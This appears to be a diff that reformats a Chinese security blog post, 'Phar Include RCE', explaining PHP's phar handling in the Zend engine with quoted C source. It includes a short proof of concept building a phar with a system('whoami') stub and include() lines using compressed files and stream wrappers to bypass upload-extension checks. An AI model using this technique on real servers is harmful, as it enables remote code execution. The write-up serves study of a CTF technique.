@@ -1,6 +1,325 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Phar Include RCE | w8nn9z Blog</title><meta name=keywords content><meta name=description content="Phar Include RCE - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://z9nn8w.github.io/posts/web/pharinclude/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://z9nn8w.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://z9nn8w.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://z9nn8w.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://z9nn8w.github.io/apple-touch-icon.png><link rel=mask-icon href=https://z9nn8w.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://z9nn8w.github.io/posts/web/pharinclude/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/pharinclude/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="Phar Include RCE"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-08-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-20T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Phar Include RCE"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://z9nn8w.github.io/posts/"},{"@type":"ListItem","position":2,"name":"WEB","item":"https://z9nn8w.github.io/posts/web/"},{"@type":"ListItem","position":3,"name":"Phar Include RCE","item":"https://z9nn8w.github.io/posts/web/pharinclude/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Phar Include RCE","name":"Phar Include RCE","description":"","keywords":[],"articleBody":"Include底层逻辑 在调用include() 时会调用 Zend 引擎中的compile_filename()，根据文件路径（filename）将文件编译为 zend_op_array，并返回该操作数数组。文件路径的处理、是否已加载缓存、是否需要重新编译等都会由 compile_filename()` 来决定\nzend_op_array *compile_filename(int type, zend_string *filename)\r{\rzend_file_handle file_handle;\rzend_op_array *retval;\rzend_string *opened_path = NULL;\rzend_stream_init_filename_ex(\u0026file_handle, filename);\rretval = zend_compile_file(\u0026file_handle, type);\rif (retval \u0026\u0026 file_handle.handle.stream.handle) {\rif (!file_handle.opened_path) {\rfile_handle.opened_path = opened_path = zend_string_copy(filename);\r}\rzend_hash_add_empty_element(\u0026EG(included_files), file_handle.opened_path);\rif (opened_path) {\rzend_string_release_ex(opened_path, 0);\r}\r}\rzend_destroy_file_handle(\u0026file_handle);\rreturn retval;\r} zend_compile_file是一个函数指针，对于phar：\nzend_compile_file = phar_compile_file; phar_compile_file：\nstatic zend_op_array *phar_compile_file(zend_file_handle *file_handle, int type) /* {{{ */ { zend_op_array *res; zend_string *name = NULL; int failed; phar_archive_data *phar; if (!file_handle || !file_handle-\u003efilename) { return phar_orig_compile_file(file_handle, type); } if (strstr(ZSTR_VAL(file_handle-\u003efilename), \".phar\") \u0026\u0026 !strstr(ZSTR_VAL(file_handle-\u003efilename), \"://\")) { if (SUCCESS == phar_open_from_filename(ZSTR_VAL(file_handle-\u003efilename), ZSTR_LEN(file_handle-\u003efilename), NULL, 0, 0, \u0026phar, NULL)) { if (phar-\u003eis_zip || phar-\u003eis_tar) { zend_file_handle f; /* zip or tar-based phar */ name = zend_strpprintf(4096, \"phar://%s/%s\", ZSTR_VAL(file_handle-\u003efilename), \".phar/stub.php\"); zend_stream_init_filename_ex(\u0026f, name); if (SUCCESS == zend_stream_open_function(\u0026f)) { zend_string_release(f.filename); f.filename = file_handle-\u003efilename; if (f.opened_path) { zend_string_release(f.opened_path); } f.opened_path = file_handle-\u003eopened_path; switch (file_handle-\u003etype) { case ZEND_HANDLE_STREAM: if (file_handle-\u003ehandle.stream.closer \u0026\u0026 file_handle-\u003ehandle.stream.handle) { file_handle-\u003ehandle.stream.closer(file_handle-\u003ehandle.stream.handle); } file_handle-\u003ehandle.stream.handle = NULL; break; default: break; } *file_handle = f; } } else if (phar-\u003eflags \u0026 PHAR_FILE_COMPRESSION_MASK) { /* compressed phar */ file_handle-\u003etype = ZEND_HANDLE_STREAM; /* we do our own reading directly from the phar, don't change the next line */ file_handle-\u003ehandle.stream.handle = phar; file_handle-\u003ehandle.stream.reader = phar_zend_stream_reader; file_handle-\u003ehandle.stream.closer = NULL; file_handle-\u003ehandle.stream.fsizer = phar_zend_stream_fsizer; file_handle-\u003ehandle.stream.isatty = 0; phar-\u003eis_persistent ? php_stream_rewind(PHAR_G(cached_fp)[phar-\u003ephar_pos].fp) : php_stream_rewind(phar-\u003efp); } } } zend_try { failed = 0; CG(zend_lineno) = 0; res = phar_orig_compile_file(file_handle, type); } zend_catch { failed = 1; res = NULL; } zend_end_try(); if (name) { zend_string_release(name); } if (failed) { zend_bailout(); } return res; } /* }}} */ 只要文件名中包含.phar且不含://就会调用phar_open_from_filename：\nint phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* {{{ */ { php_stream *fp; zend_string *actual; int ret, is_data = 0; if (error) { *error = NULL; } if (!strstr(fname, \".phar\")) { is_data = 1; } if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) { return SUCCESS; } else if (error \u0026\u0026 *error) { return FAILURE; } if (php_check_open_basedir(fname)) { return FAILURE; } fp = php_stream_open_wrapper(fname, \"rb\", IGNORE_URL|STREAM_MUST_SEEK, \u0026actual); if (!fp) { if (options \u0026 REPORT_ERRORS) { if (error) { spprintf(error, 0, \"unable to open phar for reading \\\"%s\\\"\", fname); } } if (actual) { zend_string_release_ex(actual, 0); } return FAILURE; } if (actual) { fname = ZSTR_VAL(actual); fname_len = ZSTR_LEN(actual); } ret = phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error); if (actual) { zend_string_release_ex(actual, 0); } return ret; } /* }}}*/ phar_open_from_fp：\nstatic int phar_open_from_fp(php_stream* fp, char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, int is_data, char **error) /* {{{ */ { static const char token[] = \"__HALT_COMPILER();\"; static const char zip_magic[] = \"PK\\x03\\x04\"; static const char gz_magic[] = \"\\x1f\\x8b\\x08\"; static const char bz_magic[] = \"BZh\"; char *pos, test = '\\0'; int recursion_count = 3; // arbitrary limit to avoid too deep or even infinite recursion const int window_size = 1024; char buffer[1024 + sizeof(token)]; /* a 1024 byte window + the size of the halt_compiler token (moving window) */ const zend_long readsize = sizeof(buffer) - sizeof(token); const zend_long tokenlen = sizeof(token) - 1; zend_long halt_offset; size_t got; uint32_t compression = PHAR_FILE_COMPRESSED_NONE; if (error) { *error = NULL; } if (-1 == php_stream_rewind(fp)) { MAPPHAR_ALLOC_FAIL(\"cannot rewind phar \\\"%s\\\"\") } buffer[sizeof(buffer)-1] = '\\0'; memset(buffer, 32, sizeof(token)); halt_offset = 0; /* Maybe it's better to compile the file instead of just searching, */ /* but we only want the offset. So we want a .re scanner to find it. */ while(!php_stream_eof(fp)) { if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) \u003c (size_t) tokenlen) { MAPPHAR_ALLOC_FAIL(\"internal corruption of phar \\\"%s\\\" (truncated entry)\") } if (!test \u0026\u0026 recursion_count) { test = '\\1'; pos = buffer+tokenlen; if (!memcmp(pos, gz_magic, 3)) { char err = 0; php_stream_filter *filter; php_stream *temp; /* to properly decompress, we have to tell zlib to look for a zlib or gzip header */ zval filterparams; if (!PHAR_G(has_zlib)) { MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\" to temporary file, enable zlib extension in php.ini\") } array_init(\u0026filterparams); /* this is defined in zlib's zconf.h */ #ifndef MAX_WBITS #define MAX_WBITS 15 #endif add_assoc_long_ex(\u0026filterparams, \"window\", sizeof(\"window\") - 1, MAX_WBITS + 32); /* entire file is gzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\"unable to create temporary file for decompression of gzipped phar archive \\\"%s\\\"\") } php_stream_rewind(fp); filter = php_stream_filter_create(\"zlib.inflate\", \u0026filterparams, php_stream_is_persistent(fp)); if (!filter) { err = 1; add_assoc_long_ex(\u0026filterparams, \"window\", sizeof(\"window\") - 1, MAX_WBITS); filter = php_stream_filter_create(\"zlib.inflate\", \u0026filterparams, php_stream_is_persistent(fp)); zend_array_destroy(Z_ARR(filterparams)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\", ext/zlib is buggy in PHP versions older than 5.2.6\") } } else { zend_array_destroy(Z_ARR(filterparams)); } php_stream_filter_append(\u0026temp-\u003ewritefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); if (err) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\", ext/zlib is buggy in PHP versions older than 5.2.6\") } php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\" to temporary file\") } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_GZ; /* now, start over */ test = '\\0'; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\"\"); break; } continue; } else if (!memcmp(pos, bz_magic, 3)) { php_stream_filter *filter; php_stream *temp; if (!PHAR_G(has_bz2)) { MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\" to temporary file, enable bz2 extension in php.ini\") } /* entire file is bzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\"unable to create temporary file for decompression of bzipped phar archive \\\"%s\\\"\") } php_stream_rewind(fp); filter = php_stream_filter_create(\"bzip2.decompress\", NULL, php_stream_is_persistent(fp)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\", filter creation failed\") } php_stream_filter_append(\u0026temp-\u003ewritefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\" to temporary file\") } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_BZ2; /* now, start over */ test = '\\0'; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\"unable to decompress bzipped phar archive \\\"%s\\\"\"); break; } continue; } if (!memcmp(pos, zip_magic, 4)) { php_stream_seek(fp, 0, SEEK_END); return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error); } if (got \u003e= 512) { if (phar_is_tar(pos, fname)) { php_stream_rewind(fp); return phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error); } } } if (got \u003e 0 \u0026\u0026 (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) { halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */ return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error); } halt_offset += got; memmove(buffer, buffer + window_size, tokenlen); /* move the memory buffer by the size of the window */ } MAPPHAR_ALLOC_FAIL(\"internal corruption of phar \\\"%s\\\" (__HALT_COMPILER(); not found)\") } /* }}} */ 简单来说这个函数负责打开一个可能是 PHAR 的文件流，根据文件头来识别它的格式（PHAR、ZIP、TAR、GZ、BZ2），并进行相应的解压和解析，比如文件格式是GZ，就会先进行解压获取其中的phar文件，再进行解析\n利用phar压缩包实现RCE 根据这个特性，可以实现上传不包含php代码的文件实现RCE，一个简单的poc：\n\u003c?php $phar = new Phar('exploit.phar'); $phar-\u003estartBuffering(); $stub = \u003c\u003c\u003c'STUB' \u003c?php system('whoami'); __HALT_COMPILER(); ?\u003e STUB; $phar-\u003esetStub($stub); $phar-\u003eaddFromString('test.txt', 'test'); $phar-\u003estopBuffering(); ?\u003e tar和phar都有php明文代码，没必要专门打包一个tar文件，所以选择直接include这个phar文件或压缩文件都可以实现RCE，利用了.phar文件名实现了解压：\ninclude(\"exploit.phar.gz\"); // gzip exploit.phar include(\"exploit.phar.bz2\"); // bzip2 exploit.phar 比较奇怪为什么zip没有成功，只能用伪协议，当然gz和bzip2也能用伪协议：\ninclude(\"zip://exploit.phar.zip#exploit.phar\"); include(\"compress.zlib://exploit.phar.gz\"); include(\"compress.bzip2://exploit.phar.bz2\"); 之前也提到是根据文件头来识别压缩文件的，所以说即使后缀不为.gz .bz2也是可以实现解压的，可以用于绕过后缀名的检验，只要文件是相应压缩包格式即可\n参考资料：\nhttps://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/\n","wordCount":"1705","inLanguage":"en","datePublished":"2025-08-20T00:00:00Z","dateModified":"2025-08-20T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://z9nn8w.github.io/posts/web/pharinclude/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://z9nn8w.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://z9nn8w.github.io/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
-<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
-<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://z9nn8w.github.io/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://z9nn8w.github.io/posts title=文章><span>文章</span></a></li><li><a href=https://z9nn8w.github.io/archives title=归档><span>归档</span></a></li><li><a href=https://z9nn8w.github.io/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Phar Include RCE</h1><div class=post-meta><span title='2025-08-20 00:00:00 +0000 UTC'>August 20, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#include%e5%ba%95%e5%b1%82%e9%80%bb%e8%be%91 aria-label=Include底层逻辑>Include底层逻辑</a></li><li><a href=#%e5%88%a9%e7%94%a8phar%e5%8e%8b%e7%bc%a9%e5%8c%85%e5%ae%9e%e7%8e%b0rce aria-label=利用phar压缩包实现RCE>利用phar压缩包实现RCE</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=include底层逻辑>Include底层逻辑<a hidden class=anchor aria-hidden=true href=#include底层逻辑>#</a></h2><p>在调用<code>include() 时会调用 Zend 引擎中的</code>compile_filename()<code>，根据文件路径（filename）将文件编译为 zend_op_array，并返回该操作数数组。文件路径的处理、是否已加载缓存、是否需要重新编译等都会由 </code>compile_filename()` 来决定</p><pre tabindex=0><code>zend_op_array *compile_filename(int type, zend_string *filename)
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Phar Include RCE | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Phar Include RCE - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/web/pharinclude/">
+
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/web/pharinclude/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/pharinclude/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="Phar Include RCE">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-20T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Phar Include RCE">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "WEB",
+      "item": "https://z9nn8w.github.io/posts/web/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Phar Include RCE",
+      "item": "https://z9nn8w.github.io/posts/web/pharinclude/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Phar Include RCE",
+  "name": "Phar Include RCE",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "Include底层逻辑 在调用include() 时会调用 Zend 引擎中的compile_filename()，根据文件路径（filename）将文件编译为 zend_op_array，并返回该操作数数组。文件路径的处理、是否已加载缓存、是否需要重新编译等都会由 compile_filename()` 来决定\nzend_op_array *compile_filename(int type, zend_string *filename)\r{\rzend_file_handle file_handle;\rzend_op_array *retval;\rzend_string *opened_path = NULL;\rzend_stream_init_filename_ex(\u0026file_handle, filename);\rretval = zend_compile_file(\u0026file_handle, type);\rif (retval \u0026\u0026 file_handle.handle.stream.handle) {\rif (!file_handle.opened_path) {\rfile_handle.opened_path = opened_path = zend_string_copy(filename);\r}\rzend_hash_add_empty_element(\u0026EG(included_files), file_handle.opened_path);\rif (opened_path) {\rzend_string_release_ex(opened_path, 0);\r}\r}\rzend_destroy_file_handle(\u0026file_handle);\rreturn retval;\r} zend_compile_file是一个函数指针，对于phar：\nzend_compile_file = phar_compile_file; phar_compile_file：\nstatic zend_op_array *phar_compile_file(zend_file_handle *file_handle, int type) /* {{{ */ { zend_op_array *res; zend_string *name = NULL; int failed; phar_archive_data *phar; if (!file_handle || !file_handle-\u003efilename) { return phar_orig_compile_file(file_handle, type); } if (strstr(ZSTR_VAL(file_handle-\u003efilename), \".phar\") \u0026\u0026 !strstr(ZSTR_VAL(file_handle-\u003efilename), \"://\")) { if (SUCCESS == phar_open_from_filename(ZSTR_VAL(file_handle-\u003efilename), ZSTR_LEN(file_handle-\u003efilename), NULL, 0, 0, \u0026phar, NULL)) { if (phar-\u003eis_zip || phar-\u003eis_tar) { zend_file_handle f; /* zip or tar-based phar */ name = zend_strpprintf(4096, \"phar://%s/%s\", ZSTR_VAL(file_handle-\u003efilename), \".phar/stub.php\"); zend_stream_init_filename_ex(\u0026f, name); if (SUCCESS == zend_stream_open_function(\u0026f)) { zend_string_release(f.filename); f.filename = file_handle-\u003efilename; if (f.opened_path) { zend_string_release(f.opened_path); } f.opened_path = file_handle-\u003eopened_path; switch (file_handle-\u003etype) { case ZEND_HANDLE_STREAM: if (file_handle-\u003ehandle.stream.closer \u0026\u0026 file_handle-\u003ehandle.stream.handle) { file_handle-\u003ehandle.stream.closer(file_handle-\u003ehandle.stream.handle); } file_handle-\u003ehandle.stream.handle = NULL; break; default: break; } *file_handle = f; } } else if (phar-\u003eflags \u0026 PHAR_FILE_COMPRESSION_MASK) { /* compressed phar */ file_handle-\u003etype = ZEND_HANDLE_STREAM; /* we do our own reading directly from the phar, don't change the next line */ file_handle-\u003ehandle.stream.handle = phar; file_handle-\u003ehandle.stream.reader = phar_zend_stream_reader; file_handle-\u003ehandle.stream.closer = NULL; file_handle-\u003ehandle.stream.fsizer = phar_zend_stream_fsizer; file_handle-\u003ehandle.stream.isatty = 0; phar-\u003eis_persistent ? php_stream_rewind(PHAR_G(cached_fp)[phar-\u003ephar_pos].fp) : php_stream_rewind(phar-\u003efp); } } } zend_try { failed = 0; CG(zend_lineno) = 0; res = phar_orig_compile_file(file_handle, type); } zend_catch { failed = 1; res = NULL; } zend_end_try(); if (name) { zend_string_release(name); } if (failed) { zend_bailout(); } return res; } /* }}} */ 只要文件名中包含.phar且不含://就会调用phar_open_from_filename：\nint phar_open_from_filename(char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, char **error) /* {{{ */ { php_stream *fp; zend_string *actual; int ret, is_data = 0; if (error) { *error = NULL; } if (!strstr(fname, \".phar\")) { is_data = 1; } if (phar_open_parsed_phar(fname, fname_len, alias, alias_len, is_data, options, pphar, error) == SUCCESS) { return SUCCESS; } else if (error \u0026\u0026 *error) { return FAILURE; } if (php_check_open_basedir(fname)) { return FAILURE; } fp = php_stream_open_wrapper(fname, \"rb\", IGNORE_URL|STREAM_MUST_SEEK, \u0026actual); if (!fp) { if (options \u0026 REPORT_ERRORS) { if (error) { spprintf(error, 0, \"unable to open phar for reading \\\"%s\\\"\", fname); } } if (actual) { zend_string_release_ex(actual, 0); } return FAILURE; } if (actual) { fname = ZSTR_VAL(actual); fname_len = ZSTR_LEN(actual); } ret = phar_open_from_fp(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error); if (actual) { zend_string_release_ex(actual, 0); } return ret; } /* }}}*/ phar_open_from_fp：\nstatic int phar_open_from_fp(php_stream* fp, char *fname, size_t fname_len, char *alias, size_t alias_len, uint32_t options, phar_archive_data** pphar, int is_data, char **error) /* {{{ */ { static const char token[] = \"__HALT_COMPILER();\"; static const char zip_magic[] = \"PK\\x03\\x04\"; static const char gz_magic[] = \"\\x1f\\x8b\\x08\"; static const char bz_magic[] = \"BZh\"; char *pos, test = '\\0'; int recursion_count = 3; // arbitrary limit to avoid too deep or even infinite recursion const int window_size = 1024; char buffer[1024 + sizeof(token)]; /* a 1024 byte window + the size of the halt_compiler token (moving window) */ const zend_long readsize = sizeof(buffer) - sizeof(token); const zend_long tokenlen = sizeof(token) - 1; zend_long halt_offset; size_t got; uint32_t compression = PHAR_FILE_COMPRESSED_NONE; if (error) { *error = NULL; } if (-1 == php_stream_rewind(fp)) { MAPPHAR_ALLOC_FAIL(\"cannot rewind phar \\\"%s\\\"\") } buffer[sizeof(buffer)-1] = '\\0'; memset(buffer, 32, sizeof(token)); halt_offset = 0; /* Maybe it's better to compile the file instead of just searching, */ /* but we only want the offset. So we want a .re scanner to find it. */ while(!php_stream_eof(fp)) { if ((got = php_stream_read(fp, buffer+tokenlen, readsize)) \u003c (size_t) tokenlen) { MAPPHAR_ALLOC_FAIL(\"internal corruption of phar \\\"%s\\\" (truncated entry)\") } if (!test \u0026\u0026 recursion_count) { test = '\\1'; pos = buffer+tokenlen; if (!memcmp(pos, gz_magic, 3)) { char err = 0; php_stream_filter *filter; php_stream *temp; /* to properly decompress, we have to tell zlib to look for a zlib or gzip header */ zval filterparams; if (!PHAR_G(has_zlib)) { MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\" to temporary file, enable zlib extension in php.ini\") } array_init(\u0026filterparams); /* this is defined in zlib's zconf.h */ #ifndef MAX_WBITS #define MAX_WBITS 15 #endif add_assoc_long_ex(\u0026filterparams, \"window\", sizeof(\"window\") - 1, MAX_WBITS + 32); /* entire file is gzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\"unable to create temporary file for decompression of gzipped phar archive \\\"%s\\\"\") } php_stream_rewind(fp); filter = php_stream_filter_create(\"zlib.inflate\", \u0026filterparams, php_stream_is_persistent(fp)); if (!filter) { err = 1; add_assoc_long_ex(\u0026filterparams, \"window\", sizeof(\"window\") - 1, MAX_WBITS); filter = php_stream_filter_create(\"zlib.inflate\", \u0026filterparams, php_stream_is_persistent(fp)); zend_array_destroy(Z_ARR(filterparams)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\"unable to decompress gzipped phar archive \\\"%s\\\", ext/zlib is buggy in PHP versions older than 5.2.6\") } } else { zend_array_destroy(Z_ARR(filterparams)); } php_stream_filter_append(\u0026temp-\u003ewritefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); if (err) { 